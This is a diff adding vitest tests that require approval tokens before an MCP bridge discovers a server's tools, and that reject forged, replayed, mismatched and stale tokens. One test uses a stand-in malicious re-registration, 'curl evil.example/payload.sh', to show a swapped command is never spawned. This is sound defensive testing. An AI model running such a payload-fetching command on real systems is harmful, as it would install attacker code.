@@ -270,7 +270,86 @@ describe("createMemoryMcpBridge — config + gated callTool", () => {
   it("listTools on an unknown server throws (never fabricates tools)", async () => {
     const gov = createMemoryGovernance();
     const bridge = createMemoryMcpBridge({ spawnImpl: () => makeFakeServer().child, gov });
-    await expect(bridge.listTools("nope")).rejects.toBeInstanceOf(McpError);
+    await expect(bridge.listTools("nope", "tok_whatever")).rejects.toBeInstanceOf(McpError);
+  });
+});
+
+// ── the gate applies to DISCOVERY too — starting a server to ask tools/list is
+// still a native process launch (the P0 this closes: discovery previously ran
+// with zero approval) ─────────────────────────────────────────────────────────
+describe("createMemoryMcpBridge — gated listTools (discovery)", () => {
+  it("listTools RUNS after request→approve→consume (tools/list reaches the server)", async () => {
+    const gov = createMemoryGovernance();
+    const server = makeFakeServer({ tools: [{ name: "read_file" }] });
+    const bridge = createMemoryMcpBridge({
+      spawnImpl: () => server.child,
+      gov,
+      config: { fs: { command: "mcp-fs", args: ["--stdio"] } },
+    });
+    const req = await gov.request("mcp.discover", { server: "fs", argv: ["mcp-fs", "--stdio"] });
+    expect(req.decision).toBe("require-approval");
+    const { token } = await gov.approve(req.actionId);
+    const tools = await bridge.listTools("fs", token);
+    expect(tools.map((t) => t.name)).toEqual(["read_file"]);
+  });
+
+  it("listTools is REFUSED without a valid gate token — the server is NEVER spawned", async () => {
+    const gov = createMemoryGovernance();
+    const spawnImpl = vi.fn(() => makeFakeServer().child);
+    const bridge = createMemoryMcpBridge({ spawnImpl, gov, config: { fs: { command: "mcp-fs", args: [] } } });
+    await expect(bridge.listTools("fs", "tok_forged")).rejects.toBeInstanceOf(McpGateError);
+    expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it("a token bound to one server cannot authorize discovery on a different server", async () => {
+    const gov = createMemoryGovernance();
+    const spawnImpl = vi.fn(() => makeFakeServer().child);
+    const bridge = createMemoryMcpBridge({
+      spawnImpl,
+      gov,
+      config: { fs: { command: "mcp-fs", args: [] }, git: { command: "mcp-git", args: [] } },
+    });
+    const req = await gov.request("mcp.discover", { server: "fs", argv: ["mcp-fs"] });
+    const { token } = await gov.approve(req.actionId);
+    await expect(bridge.listTools("git", token)).rejects.toBeInstanceOf(McpGateError);
+    expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it("a consumed discover token cannot be replayed for a second discovery call", async () => {
+    const gov = createMemoryGovernance();
+    const server = makeFakeServer({ tools: [] });
+    const bridge = createMemoryMcpBridge({ spawnImpl: () => server.child, gov, config: { fs: { command: "mcp-fs", args: [] } } });
+    const req = await gov.request("mcp.discover", { server: "fs", argv: ["mcp-fs"] });
+    const { token } = await gov.approve(req.actionId);
+    await bridge.listTools("fs", token); // spends the token
+    await expect(bridge.listTools("fs", token)).rejects.toBeInstanceOf(McpGateError); // replay refused
+  });
+
+  it("DEFINITION SWAP: editing the server's command after approval invalidates the token — the OLD or NEW command is never spawned", async () => {
+    const gov = createMemoryGovernance();
+    const spawnImpl = vi.fn(() => makeFakeServer().child);
+    const bridge = createMemoryMcpBridge({
+      spawnImpl,
+      gov,
+      config: { fs: { command: "mcp-fs", args: ["--safe"] } },
+    });
+    // Approval is minted against today's command...
+    const req = await gov.request("mcp.discover", { server: "fs", argv: ["mcp-fs", "--safe"] });
+    const { token } = await gov.approve(req.actionId);
+    // ...but the registered definition changes before the token is spent —
+    // e.g. a malicious or mistaken re-registration of the same server name.
+    await bridge.addServer("fs", "curl", ["evil.example/payload.sh"]);
+    await expect(bridge.listTools("fs", token)).rejects.toBeInstanceOf(McpGateError);
+    expect(spawnImpl).not.toHaveBeenCalled();
+  });
+
+  it("a token minted for mcp.discover cannot be spent as an mcp.tool call, or vice versa", async () => {
+    const gov = createMemoryGovernance();
+    const bridge = createMemoryMcpBridge({ spawnImpl: () => makeFakeServer().child, gov, config: { fs: { command: "mcp-fs", args: [] } } });
+    const req = await gov.request("mcp.discover", { server: "fs", argv: ["mcp-fs"] });
+    const { token } = await gov.approve(req.actionId);
+    // Same server, but the wrong kind — a discover grant is not a tool-call grant.
+    await expect(bridge.callTool("fs", "read", {}, token)).rejects.toBeInstanceOf(McpGateError);
   });
 });
 
